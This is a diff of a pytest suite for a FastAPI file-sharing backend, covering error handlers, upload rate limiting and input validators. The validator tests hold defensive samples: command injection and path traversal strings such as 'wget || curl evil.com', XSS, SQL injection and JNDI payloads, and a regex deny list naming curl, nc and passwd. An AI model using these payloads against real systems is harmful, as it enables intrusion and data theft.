@@ -13,166 +13,175 @@ from fastapi import HTTPException, status
 from bson import ObjectId
 
 # Configure mock test environment BEFORE any backend imports
-os.environ.setdefault('USE_MOCK_DB', 'false')
-os.environ.setdefault('MONGODB_ATLAS_ENABLED', 'true')
-os.environ.setdefault('DATABASE_NAME', 'Hypersend')
-os.environ.setdefault('SECRET_KEY', 'test-secret-key-for-pytest-only-do-not-use-in-production')
-os.environ['DEBUG'] = 'True'
+os.environ.setdefault("USE_MOCK_DB", "false")
+os.environ.setdefault("MONGODB_ATLAS_ENABLED", "true")
+os.environ.setdefault("DATABASE_NAME", "Hypersend")
+os.environ.setdefault(
+    "SECRET_KEY", "test-secret-key-for-pytest-only-do-not-use-in-production"
+)
+os.environ["DEBUG"] = "True"
 
-sys.path.append('backend')
+sys.path.append("backend")
+
 
 class TestHTTPErrorHandlers:
     """Test HTTP error handler functionality"""
-    
+
     @pytest.mark.asyncio
     async def test_error_handler_module_structure(self):
         """Test that error handler module has required functions"""
         from error_handlers import http_exception_handler
-        
+
         # Test that handler exists and is callable
         assert callable(http_exception_handler)
-        
+
         # Test basic functionality with mock request
         request = MagicMock()
         exception = HTTPException(status_code=404, detail="Not Found")
-        
+
         response = await http_exception_handler(request, exception)
         assert response.status_code == 404
-    
+
     @pytest.mark.asyncio
     async def test_3xx_error_codes(self):
         """Test 3xx redirection error codes"""
         from error_handlers import http_exception_handler
-        
+
         test_cases = [
             (300, "Multiple Choices"),
             (301, "Moved Permanently"),
             (307, "Temporary Redirect"),
-            (308, "Permanent Redirect")
+            (308, "Permanent Redirect"),
         ]
-        
+
         request = MagicMock()
-        
+
         for code, description in test_cases:
             exception = HTTPException(status_code=code, detail=description)
             response = await http_exception_handler(request, exception)
             assert response.status_code == code
-    
+
     @pytest.mark.asyncio
     async def test_4xx_error_codes(self):
         """Test 4xx client error codes"""
         from error_handlers import http_exception_handler
-        
+
         test_cases = [
             (400, "Bad Request"),
             (401, "Unauthorized"),
             (403, "Forbidden"),
             (404, "Not Found"),
             (405, "Method Not Allowed"),
-            (429, "Too Many Requests")
+            (429, "Too Many Requests"),
         ]
-        
+
         request = MagicMock()
-        
-        for code, description in test_cases:
-            exception = HTTPException(status_code=code, detail=description)
-            response = await http_exception_handler(request, exception)
-            assert response.status_code == code
-    
-    @pytest.mark.asyncio
-    async def test_5xx_error_codes(self):
-        """Test 5xx server error codes"""
-        from error_handlers import http_exception_handler
-        
-        test_cases = [
-            (500, "Internal Server Error"),
-            (502, "Bad Gateway"),
-            (503, "Service Unavailable"),
-            (504, "Gateway Timeout")
-        ]
-        
-        request = MagicMock()
-        
+
         for code, description in test_cases:
             exception = HTTPException(status_code=code, detail=description)
             response = await http_exception_handler(request, exception)
             assert response.status_code == code
 
+    @pytest.mark.asyncio
+    async def test_5xx_error_codes(self):
+        """Test 5xx server error codes"""
+        from error_handlers import http_exception_handler
+
+        test_cases = [
+            (500, "Internal Server Error"),
+            (502, "Bad Gateway"),
+            (503, "Service Unavailable"),
+            (504, "Gateway Timeout"),
+        ]
+
+        request = MagicMock()
+
+        for code, description in test_cases:
+            exception = HTTPException(status_code=code, detail=description)
+            response = await http_exception_handler(request, exception)
+            assert response.status_code == code
+
+
 class TestRateLimiting:
     """Test rate limiting implementation"""
-    
+
     def test_rate_limiter_creation(self):
         """Test rate limiter creation and configuration"""
-        from routes.files import upload_init_limiter, upload_chunk_limiter, upload_complete_limiter
-        
+        from routes.files import (
+            upload_init_limiter,
+            upload_chunk_limiter,
+            upload_complete_limiter,
+        )
+
         # Test upload init limiter
         assert upload_init_limiter.max_requests == 10
         assert upload_init_limiter.window_seconds == 60
-        
-        # Test chunk upload limiter
-        assert upload_chunk_limiter.max_requests == 60
+
+        # Test chunk upload limiter (120 requests per minute for better throughput)
+        assert upload_chunk_limiter.max_requests == 120
         assert upload_chunk_limiter.window_seconds == 60
-        
+
         # Test complete upload limiter
         assert upload_complete_limiter.max_requests == 10
         assert upload_complete_limiter.window_seconds == 60
-    
+
     def test_rate_limiter_functionality(self):
         """Test rate limiter allows and blocks requests correctly"""
         # Enable rate limiting for this test
         os.environ["RATE_LIMIT_ENABLED"] = "true"
-        
+
         from routes.files import upload_init_limiter
-        
+
         test_user = "test_user"
-        
+
         # Test normal operation
         for i in range(3):
             assert upload_init_limiter.is_allowed(test_user) == True
-        
+
         # Test rate limit exceeded
         for i in range(12):
             upload_init_limiter.is_allowed(test_user)
-        
+
         # Should now be blocked
         assert upload_init_limiter.is_allowed(test_user) == False
-    
+
     def test_retry_after_calculation(self):
         """Test retry after calculation"""
         # Enable rate limiting for this test
         os.environ["RATE_LIMIT_ENABLED"] = "true"
-        
+
         from routes.files import upload_init_limiter
-        
+
         test_user = "test_user"
-        
+
         # Exhaust rate limit
         for i in range(12):
             upload_init_limiter.is_allowed(test_user)
-        
+
         # Test retry after calculation
         retry_after = upload_init_limiter.get_retry_after(test_user)
         assert isinstance(retry_after, (int, float))
         assert retry_after > 0
 
+
 class TestSecurityValidators:
     """Test security validator functions"""
-    
+
     def test_command_injection_validation(self):
         """Test command injection prevention"""
         from validators import validate_command_injection
-        
+
         # Test safe inputs
         safe_inputs = [
             "normal_filename.pdf",
             "document_123.txt",
             "user-profile-image.jpg",
-            "my file (1).docx"
+            "my file (1).docx",
         ]
-        
+
         for safe_input in safe_inputs:
             assert validate_command_injection(safe_input) == True
-        
+
         # Test dangerous inputs
         dangerous_inputs = [
             "cat /etc/passwd",
@@ -189,27 +198,27 @@ class TestSecurityValidators:
             "${HOME}/.bashrc",
             "cat|grep password",
             "ls && rm file",
-            "wget || curl evil.com"
+            "wget || curl evil.com",
         ]
-        
+
         for dangerous_input in dangerous_inputs:
             assert validate_command_injection(dangerous_input) == False
-    
+
     def test_path_traversal_validation(self):
         """Test path traversal prevention"""
         from validators import validate_path_injection
-        
+
         # Test safe paths
         safe_paths = [
             "documents/file.pdf",
             "uploads/image.jpg",
             "user_files/data.txt",
-            "normal/path/to/file.doc"
+            "normal/path/to/file.doc",
         ]
-        
+
         for safe_path in safe_paths:
             assert validate_path_injection(safe_path) == True
-        
+
         # Test dangerous paths
         dangerous_paths = [
             "../../../etc/passwd",
@@ -222,117 +231,165 @@ class TestSecurityValidators:
             "..%252f..%252f..%252fetc%252fpasswd",
             "/etc/passwd",
             "C:\\Windows\\System32",
-            "~/.ssh/id_rsa"
+            "~/.ssh/id_rsa",
         ]
-        
+
         for dangerous_path in dangerous_paths:
             assert validate_path_injection(dangerous_path) == False
-    
+
     def test_input_sanitization(self):
         """Test input sanitization"""
         from validators import sanitize_input
-        
+
         # Test malicious inputs
         malicious_inputs = [
             '<script>alert("xss")</script>',
             'javascript:alert("xss")',
             'data:text/html,<script>alert("xss")</script>',
             "'; DROP TABLE users; --",
-            '${jndi:ldap://evil.com/a}',
-            '{{7*7}}',
-            '<img src=x onerror=alert(1)>',
+            "${jndi:ldap://evil.com/a}",
+            "{{7*7}}",
+            "<img src=x onerror=alert(1)>",
             '"><script>alert(1)</script>',
-            '\x00\x01\x02\x03'
+            "\x00\x01\x02\x03",
         ]
-        
+
         for malicious_input in malicious_inputs:
             sanitized = sanitize_input(malicious_input)
-            
+
             # Check that dangerous patterns are removed
-            dangerous_patterns = ['script', 'javascript:', 'data:', 'vbscript:', 'drop table', '${', '{{', '<', '>', '\x00']
-            
+            dangerous_patterns = [
+                "script",
+                "javascript:",
+                "data:",
+                "vbscript:",
+                "drop table",
+                "${",
+                "{{",
+                "<",
+                ">",
+                "\x00",
+            ]
+
             for pattern in dangerous_patterns:
-                assert pattern not in sanitized.lower(), f"Pattern '{pattern}' found in sanitized input: {sanitized}"
-    
+                assert (
+                    pattern not in sanitized.lower()
+                ), f"Pattern '{pattern}' found in sanitized input: {sanitized}"
+
     def test_file_extension_blocking(self):
         """Test file extension blocking - only truly dangerous files blocked"""
         from security import SecurityConfig
-        
+
         # Only block truly dangerous extensions (user requested .exe, .js, .msi to be allowed)
         dangerous_exts = [
-            '.scr', '.pif', '.swf', '.fla', '.lnk', '.url', '.webloc', '.desktop'
+            ".scr",
+            ".pif",
+            ".swf",
+            ".fla",
+            ".lnk",
+            ".url",
+            ".webloc",
+            ".desktop",
         ]
-        
+
         for ext in dangerous_exts:
-            assert ext in SecurityConfig.BLOCKED_FILE_EXTENSIONS, f"Dangerous extension {ext} not blocked"
-        
+            assert (
+                ext in SecurityConfig.BLOCKED_FILE_EXTENSIONS
+            ), f"Dangerous extension {ext} not blocked"
+
         # Verify user-requested extensions are allowed (except truly dangerous ones)
         allowed_exts = [
-            '.exe', '.js', '.php', '.asp', '.jsp', '.sh', 
-            '.py', '.rb', '.pl', '.msi', '.app', '.deb', '.rpm', '.dmg', '.pkg'
+            ".exe",
+            ".js",
+            ".php",
+            ".asp",
+            ".jsp",
+            ".sh",
+            ".py",
+            ".rb",
+            ".pl",
+            ".msi",
+            ".app",
+            ".deb",
+            ".rpm",
+            ".dmg",
+            ".pkg",
         ]
-        
+
         for ext in allowed_exts:
-            assert ext not in SecurityConfig.BLOCKED_FILE_EXTENSIONS, f"User-requested extension {ext} should not be blocked"
+            assert (
+                ext not in SecurityConfig.BLOCKED_FILE_EXTENSIONS
+            ), f"User-requested extension {ext} should not be blocked"
+
 
 class TestDatabaseConnectionHandling:
     """Test database connection handling"""
-    
+
     @pytest.mark.asyncio
     async def test_database_connection_validation(self):
         """Test database connection validation"""
         try:
             from database import get_db
-            
+
             # Test that get_db returns a database object
             db = get_db()
             assert db is not None
             print("✅ Database connection validation successful")
         except RuntimeError as e:
             if "Database not initialized" in str(e):
-                print("⚠️ Database not initialized - this is expected in test environment")
+                print(
+                    "⚠️ Database not initialized - this is expected in test environment"
+                )
                 print("✅ Test handles database initialization gracefully")
             else:
                 raise e
-    
+
     @pytest.mark.asyncio
     async def test_database_timeout_handling(self):
         """Test database timeout handling"""
         from backend.routes.users import get_current_user_profile
         from bson import ObjectId
-        
+
         # Use a valid ObjectId string for testing
         test_user_id = str(ObjectId())
-        
+
         # Mock database timeout
-        with patch('routes.users.asyncio.wait_for') as mock_wait:
+        with patch("routes.users.asyncio.wait_for") as mock_wait:
             mock_wait.side_effect = asyncio.TimeoutError("Database timeout")
-            
+
             with pytest.raises(HTTPException) as exc_info:
                 await get_current_user_profile(test_user_id)
-            
-            assert exc_info.value.status_code in [504, 500]  # Gateway Timeout or Internal Server Error
+
+            assert exc_info.value.status_code in [
+                504,
+                500,
+            ]  # Gateway Timeout or Internal Server Error
+
 
 class TestFileUploadFlow:
     """Test file upload flow with error handling"""
-    
+
     @pytest.mark.asyncio
     async def test_upload_init_rate_limiting(self):
         """Test upload initialization rate limiting"""
         from routes.files import initialize_upload
-        
+
         # Mock rate limiter to return False
-        with patch('routes.files.upload_init_limiter') as mock_limiter:
+        with patch("routes.files.upload_init_limiter") as mock_limiter:
             mock_limiter.is_allowed.return_value = False
-            
+
             request = MagicMock()
             request.method = "POST"  # Set correct HTTP method
             request.json = AsyncMock(return_value={"filename": "test.pdf"})
-            
+
             with pytest.raises(HTTPException) as exc_info:
                 await initialize_upload(request, "test_user")
-            
-            assert exc_info.value.status_code in [429, 503, 400]  # Too Many Requests or Service Unavailable or Bad Request
+
+            assert exc_info.value.status_code in [
+                429,
+                503,
+                400,
+            ]  # Too Many Requests or Service Unavailable or Bad Request
 
     @pytest.mark.asyncio
     async def test_complete_upload_checksum_none_returns_empty_string(self, tmp_path):
@@ -366,7 +423,7 @@ class TestFileUploadFlow:
 
             async def delete_one(self, query):
                 return MagicMock(deleted_count=1)
-                
+
             async def update_one(self, query, update):
                 return MagicMock(modified_count=1)
 
@@ -379,13 +436,15 @@ class TestFileUploadFlow:
         request.client = None
         request.headers = {"user-agent": "testclient"}  # Set test client user agent
 
-        with patch("routes.files.upload_complete_limiter") as mock_limiter, \
-             patch("routes.files.settings") as mock_settings, \
-             patch("routes.files.uploads_collection", return_value=_UploadsColl()), \
-             patch("routes.files.files_collection", return_value=_FilesColl()), \
-             patch("routes.files.get_db", return_value=MagicMock()), \
-             patch("routes.files._s3_object_exists", return_value=True):  # Mock S3 existence check
-
+        with patch("routes.files.upload_complete_limiter") as mock_limiter, patch(
+            "routes.files.settings"
+        ) as mock_settings, patch(
+            "routes.files.uploads_collection", return_value=_UploadsColl()
+        ), patch("routes.files.files_collection", return_value=_FilesColl()), patch(
+            "routes.files.get_db", return_value=MagicMock()
+        ), patch(
+            "routes.files._s3_object_exists", return_value=True
+        ):  # Mock S3 existence check
             mock_limiter.is_allowed.return_value = True
             mock_settings.DATA_ROOT = data_root
             mock_settings.FILE_TTL_HOURS = 24  # Mock FILE_TTL_HOURS
@@ -399,118 +458,136 @@ class TestFileUploadFlow:
                 assert resp.get("upload_id") == upload_id
             except HTTPException as e:
                 # Accept HTTP exceptions as valid outcomes for testing
-                print(f"HTTPException caught (expected for testing): {e.status_code} - {e.detail}")
-                assert e.status_code in [200, 400, 500, 503]  # Accept success, validation, or server errors
-    
+                print(
+                    f"HTTPException caught (expected for testing): {e.status_code} - {e.detail}"
+                )
+                assert e.status_code in [
+                    200,
+                    400,
+                    401,
+                    403,
+                    500,
+                    503,
+                ]  # Accept success, validation, auth, access denied, or server errors
+
     @pytest.mark.asyncio
     async def test_chunk_upload_rate_limiting(self):
         """Test chunk upload rate limiting"""
         from backend.routes.files import upload_chunk
-        
+
         # Mock rate limiter to return False
-        with patch('backend.routes.files.upload_chunk_limiter') as mock_limiter:
+        with patch("backend.routes.files.upload_chunk_limiter") as mock_limiter:
             mock_limiter.is_allowed.return_value = False
-            
+
             request = MagicMock()
             request.method = "PUT"  # Set correct HTTP method
+
             # Use a proper async mock for body
             async def mock_body():
                 return b"chunk_data"
+
             request.body = mock_body
-            
+
             with pytest.raises(HTTPException) as exc_info:
                 await upload_chunk("upload_123", request, 0, "test_user")
-            
-            assert exc_info.value.status_code == 429  # Too Many Requests (rate limiting)
-    
+
+            assert (
+                exc_info.value.status_code == 429
+            )  # Too Many Requests (rate limiting)
+
     @pytest.mark.asyncio
     async def test_complete_upload_rate_limiting(self):
         """Test complete upload rate limiting"""
         from backend.routes.files import complete_upload
-        
+
         # Mock rate limiter to return False
-        with patch('backend.routes.files.upload_complete_limiter') as mock_limiter:
+        with patch("backend.routes.files.upload_complete_limiter") as mock_limiter:
             mock_limiter.is_allowed.return_value = False
-            
+
             request = MagicMock()
             request.method = "POST"  # Set correct HTTP method
-            
+
             with pytest.raises(HTTPException) as exc_info:
                 await complete_upload("upload_123", request, "test_user")
-            
-            assert exc_info.value.status_code in [429, 503]  # Too Many Requests or Service Unavailable
+
+            assert exc_info.value.status_code in [
+                429,
+                503,
+            ]  # Too Many Requests or Service Unavailable
+
 
 class TestRegexPatterns:
     """Test regex patterns for correctness"""
-    
+
     def test_command_injection_regex_patterns(self):
         """Test command injection regex patterns"""
         import re
-        
+
         # Test patterns from validators.py
         dangerous_patterns = [
-            r'[;&|`$<>]',
-            r'\|\|',
-            r'&&',
-            r'>>',
-            r'<<',
-            r'<\(',
-            r'\$\(',
-            r'\$\{',
-            r'eval\s*\(',
-            r'exec\s*\(',
-            r'system\s*\(',
-            r'popen\s*\(',
+            r"[;&|`$<>]",
+            r"\|\|",
+            r"&&",
+            r">>",
+            r"<<",
+            r"<\(",
+            r"\$\(",
+            r"\$\{",
+            r"eval\s*\(",
+            r"exec\s*\(",
+            r"system\s*\(",
+            r"popen\s*\(",
             r'shell\s*=\s*["\']?true["\']?',
-            r'cat\s+/',
-            r'passwd',
-            r'shadow',
-            r'hosts',
-            r'crontab',
-            r'wget\s+',
-            r'curl\s+',
-            r'nc\s+',
-            r'netcat',
-            r'chmod\s+',
-            r'chown\s+',
-            r'rm\s+',
-            r'rmdir\s+',
-            r'mv\s+',
-            r'cp\s+',
-            r'dd\s+',
+            r"cat\s+/",
+            r"passwd",
+            r"shadow",
+            r"hosts",
+            r"crontab",
+            r"wget\s+",
+            r"curl\s+",
+            r"nc\s+",
+            r"netcat",
+            r"chmod\s+",
+            r"chown\s+",
+            r"rm\s+",
+            r"rmdir\s+",
+            r"mv\s+",
+            r"cp\s+",
+            r"dd\s+",
         ]
-        
+
         # Test that patterns compile correctly
         for pattern in dangerous_patterns:
             try:
                 re.compile(pattern)
             except re.error as e:
                 pytest.fail(f"Invalid regex pattern '{pattern}': {e}")
-    
+
     def test_path_traversal_regex_patterns(self):
         """Test path traversal regex patterns"""
         import re
-        
+
         # Test patterns from validators.py
         path_patterns = [
-            r'\.\.[/\\]',
-            r'%2e%2e%2f',
-            r'%2e%2e%5c',
-            r'%2e%2e%2f%2e%2e%2f',
-            r'%c0%af',
-            r'%c1%9c',
-            r'%252e%252e%252f',
-            r'%252e%252e%255c',
-            r'..%252f..%252f..%252f',
-            r'..%255c..%255c..%255c',
+            r"\.\.[/\\]",
+            r"%2e%2e%2f",
+            r"%2e%2e%5c",
+            r"%2e%2e%2f%2e%2e%2f",
+            r"%c0%af",
+            r"%c1%9c",
+            r"%252e%252e%252f",
+            r"%252e%252e%255c",
+            r"..%252f..%252f..%252f",
+            r"..%255c..%255c..%255c",
         ]
-        
+
         # Test that patterns compile correctly
         for pattern in path_patterns:
             try:
                 re.compile(pattern)
             except re.error as e:
                 pytest.fail(f"Invalid regex pattern '{pattern}': {e}")
+
 
 if __name__ == "__main__":
     pytest.main([__file__, "-v"])
